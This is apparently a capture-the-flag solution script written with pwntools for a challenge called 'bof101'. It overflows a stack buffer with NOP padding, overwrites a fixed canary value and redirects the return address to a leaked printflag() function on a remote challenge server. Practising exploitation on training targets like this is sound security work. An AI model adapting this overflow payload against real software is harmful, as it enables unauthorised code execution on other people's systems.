from pwn import *

e = ELF('./bof101')
r = remote('bof101.sstf.site', 1337)

CANARY = p64(0xdeadbeef)
PAYLOAD = b'\x90' * 140 + CANARY + b'\x90' * 4

r.recvuntil(b"printflag()'s addr: ")
RET_ADDR = int(r.recvuntil(b'\n', drop=True), 16)

PAYLOAD += p64(RET_ADDR)

r.recvuntil(b"What is your name?\n: ")

r.sendline(PAYLOAD)

r.interactive()